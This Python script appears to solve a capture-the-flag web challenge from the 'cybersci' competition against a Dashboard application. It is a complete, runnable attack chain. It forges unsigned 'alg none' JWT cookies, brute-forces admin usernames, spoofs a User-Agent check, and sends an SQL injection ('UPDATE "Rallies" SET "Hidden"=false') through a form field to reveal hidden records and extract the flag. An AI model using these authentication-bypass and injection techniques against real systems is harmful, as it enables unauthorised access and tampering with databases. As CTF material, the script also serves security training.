import base64
import json
import re
import time
from typing import Any, Dict, Optional, Tuple

import bs4
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "https://10.0.2.61/Dashboard"  # If running remotely
url = "https://localhost/Dashboard"  # If running locally

cookies = {
    "token": "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6ImFkbWluMTgyMSIsImV4cCI6MTczMjM4NjM0M30."
}


def get_jwt_header() -> str:
    jwt_header = {"alg": "none", "typ": "JWT"}
    jwt_header = json.dumps(jwt_header)
    jwt_header = (base64.b64encode(jwt_header.encode())).decode()
    jwt_header = jwt_header.strip("=")
    return jwt_header


def get_jwt_payload(username: str) -> str:
    key = "http://schemas.xmlsoap.org/ws/2005/05/identity/claims/nameidentifier"
    payload = {"exp": int(time.time() + 100000)}
    payload[key] = username

    jwt_payload = json.dumps(payload)
    jwt_payload = (base64.b64encode(jwt_payload.encode())).decode()
    jwt_payload = jwt_payload.strip("=")

    return jwt_payload


def get_jwt(username: str) -> str:
    return get_jwt_header() + "." + get_jwt_payload(username) + "."


def get_cookies(username: str) -> Dict[str, str]:
    return {"token": get_jwt(username)}


def get_page(username: str) -> requests.Response:
    # Server has a middleware that checks the user-agent being passed
    headers = {"User-Agent": "Chrome/"}
    cookies = get_cookies(username)
    return requests.get(url, headers=headers, cookies=cookies, verify=False)


def post_page(data: Dict[str, Any], cookies: Dict[str, str]) -> requests.Response:
    # Server has a middleware that checks the user-agent being passed
    headers = {"User-Agent": "Chrome/"}
    return requests.post(
        url,
        headers=headers,
        cookies=cookies,
        verify=False,
        data=data,
    )


def brute_force_username(cache: Optional[str] = None) -> Optional[str]:
    found = False
    username = None

    if cache is not None:
        found = True
        username = cache
    else:
        for i in range(1000, 2001):
            username = f"admin{i}"
            print(f"Attempting {username}", end="\r")
            result = get_page(username)

            if "Login" not in result.text:
                found = True
                print()
                break

    if found:
        print("Username:", username)
        print("Cookie:", get_cookies(username)["token"])
        print("OK\n")
    else:
        print("Failed to find username")
        print("FAIL\n")

    return username


def get_submission_codes(username: str) -> Tuple[str, str, Dict]:
    """Returns entrance code, verification token, and new cookies"""

    result = get_page(username)

    soup = bs4.BeautifulSoup(result.content, features="html.parser")
    entrance_code = soup.find("input", attrs={"id": "entrance_code"}).attrs["value"]
    verification_token = soup.find(
        "input", attrs={"name": "__RequestVerificationToken"}
    ).attrs["value"]

    return entrance_code, verification_token, result.cookies


def merge_cookies(cookies: Dict[str, str], other: Dict[str, str]) -> Dict[str, str]:
    for key, item in other.items():
        cookies[key] = item

    return cookies


def send_injection(username: str, content: str) -> bool:
    entrance_code, verification_token, new_cookies = get_submission_codes(username)
    cookies = merge_cookies(get_cookies(username), new_cookies)

    result = post_page(
        cookies=cookies,
        data={
            "RallyId": "1",
            "AttendeeName": "Banana",
            "AttendeeEntranceCode": entrance_code + content,
            "__RequestVerificationToken": verification_token,
        },
    )

    if "Attendee added successfully." in result.text:
        print("OK\n")
        return True
    else:
        print(result.text, result.status_code)
        print("FAIL\n")
        return False


# Once username is determined the first time, send it as a paramter to speed things up
print("> Brute Forcing Username")
username = brute_force_username()
if username is None:
    exit(1)

# Use mechanism to send SQL Injection for updating all rallies to not-hidden
# ', 1); UPDATE "Rallies" SET "Hidden"=false; -- -
# Injection happens on the entrance_code parameter
print("> Sending Injection")
content = '\', 1); UPDATE "Rallies" SET "Hidden"=false; -- -'
ok = send_injection(username, content)
if not ok:
    exit(1)

# Get the flag from the page
print("> Getting flag")
pattern = re.compile("cybersci{[A-Za-z0-9_-]+}")
content = get_page(username).text
print("Flag:", pattern.search(content).group())
print("OK\n")

# # Undo injection to keep challenge fun for everyone
# print("> Reversing Injection")
# content = '\', 1); UPDATE "Rallies" SET "Hidden"=true WHERE "Id"=3; -- -'
# ok = send_injection(username, content)
# if not ok:
#     exit(1)
